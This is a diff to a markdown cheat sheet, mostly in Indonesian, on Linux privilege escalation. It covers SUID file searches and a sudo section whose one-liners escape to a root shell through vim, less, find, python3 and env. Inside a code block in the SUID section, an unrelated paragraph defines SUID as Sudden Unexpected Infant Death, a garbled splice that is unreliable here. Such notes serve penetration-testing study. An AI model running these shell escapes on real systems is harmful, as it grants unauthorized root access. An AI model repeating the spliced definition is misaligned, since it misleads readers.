@@ -159,8 +159,9 @@ Kernel merupakan bagian inti pada sebuah OS. Berfungsi untuk mengatur/menghubung
 ## SUID
 SUID (Set owner User ID) is a special Linux file permission that allows a user to execute an executable file with the permissions of the file owner rather than the user running it. <br>
 
-SUID (Set User ID) adalah hak akses spesial di Linux yang memungkinkan pengguna biasa menjalankan suatu program atau file biner dengan hak akses pemilik (biasanya `root`) program tersebut.
+SUID (Set User ID) adalah hak akses spesial di Linux yang memungkinkan pengguna biasa menjalankan suatu program atau file biner dengan hak akses pemilik (biasanya `root`) program tersebut. 
 
+Merupakan fitur pada Linux dimana sebuah file dapat dieksekusi sebagai privilege owner dari file tersebut. Apabila terdapat file yang memiliki SUID sebagai `root`, maka siapapun yang mengeksekusi file tersebut akan berjalan dengan privilege root.
 ```perl
 find / -perm -u=s -type f 2>/dev/null
 
@@ -178,9 +179,17 @@ find / -perm /6000 -type f 2>/dev/null
 SUID typically refers to Sudden Unexpected Infant Death, which is an umbrella term for any sudden and unexpected infant death (under 1 year of age) before or after an investigation. This category includes both explainable causes (such as accidents or suffocation) and unexplainable causes (like SIDS).
 ```
 
-## SUID
+## SUDO
+Sudo merupakan program yang mengizinkan user untuk menjalankan file/binaries dengan privilege user lain, default-nya sebagai `root`. Biasanya user perlu password ketika menjalankan `SUDO`, dan perlu dikonfigurasi pada file `/etc/sudoers`. Namun rules dapat dibatasi pada program tertentu dan dapat diatur agar tidak perlu memasukkan password.
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+sudo -l
+# lalu cek GTFObins, lalu jalankan memakai sudo, misalnya
+
+sudo vim -c ':!/bin/sh'                       # vim
+sudo less /etc/profile  -> !/bin/sh           # less/more
+sudo find . -exec /bin/sh \; -quit            # find
+sudo python3 -c 'import os;os.system("/bin/sh")'
+sudo env /bin/sh
 ```
 
 
